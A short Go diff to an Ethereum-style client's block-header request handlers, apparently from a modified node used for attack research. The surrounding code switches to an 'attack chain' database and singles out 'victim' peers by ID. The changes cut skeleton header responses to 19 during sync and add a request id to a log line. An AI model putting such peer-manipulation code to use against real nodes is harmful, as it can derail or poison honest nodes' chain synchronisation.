@@ -43,7 +43,7 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 		return fmt.Errorf("%w: message %v: %v", errDecode, msg, err)
 	}
 
-	log.Info("Received query", "query", query.GetBlockHeadersPacket)
+	log.Info("Received query", "query", query.GetBlockHeadersPacket, "id", query.RequestId)
 
 	if must, chainType := bridge.MustChangeAttackChain(); must {
 		db := bridge.GetChainDatabase(chainType)
@@ -191,6 +191,11 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	if !hashMode && query.Amount == 128 && query.Skip == 191 && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 		bridge.SetSkeletonStart(query.Origin.Number)
 		skeleton = true
+
+		if bridge.DoingSync() {
+			log.Info("Providing only 19 skeleton headers")
+			query.Amount = 19
+		}
 	}
 
 
